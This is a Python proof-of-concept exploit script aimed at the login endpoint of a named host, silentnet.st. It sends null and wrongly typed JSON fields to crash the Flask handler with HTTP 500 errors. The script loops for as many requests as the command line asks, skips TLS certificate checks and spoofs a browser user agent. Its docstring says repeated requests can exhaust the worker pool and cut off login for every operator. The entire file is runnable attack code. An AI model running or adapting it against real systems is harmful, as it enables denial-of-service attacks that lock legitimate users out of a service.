#!/usr/bin/env python3
"""
POC-S02: HTTP 500 DoS via null/typed fields on /auth/login — silentnet.st
==========================================================================
Target:  https://silentnet.st
Vuln:    POST /auth/login crashes the Flask login route handler with HTTP 500
         when userId or accountKey fields are set to null (None) or non-string
         types (array, object). The server does not validate field types before
         processing, causing an unhandled Python TypeError/AttributeError.
Impact:  Repeated requests can exhaust Flask worker pool, degrading login
         availability for all operators on the platform.
Author:  Security Research — 2026-07-20
"""
import urllib.request, urllib.error, ssl, json, time, sys

TARGET   = "silentnet.st"
REQUESTS = int(sys.argv[1]) if len(sys.argv) > 1 else 10

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

CRASH_PAYLOADS = [
    {"userId": None,      "accountKey": None},
    {"userId": [1, 2, 3], "accountKey": "test"},
    {"userId": {"a": 1},  "accountKey": "test"},
]

def send(payload):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        f"https://{TARGET}/auth/login",
        data=data, method="POST",
        headers={"Content-Type": "application/json",
                 "User-Agent": "Mozilla/5.0"}
    )
    try:
        r = urllib.request.urlopen(req, timeout=10, context=ctx)
        return r.status
    except urllib.error.HTTPError as e:
        return e.code

print(f"=== LOGIN HANDLER CRASH POC ({REQUESTS} requests) ===")
crash_count = 0
for i in range(REQUESTS):
    payload = CRASH_PAYLOADS[i % len(CRASH_PAYLOADS)]
    code = send(payload)
    if code == 500:
        crash_count += 1
    print(f"  [{i+1:2d}] HTTP {code} {'[CRASH]' if code==500 else '[OK]'} <- {payload}")

print()
print(f"[+] {crash_count}/{REQUESTS} requests caused HTTP 500")
print(f"[+] Crash rate: {crash_count/REQUESTS*100:.0f}%")
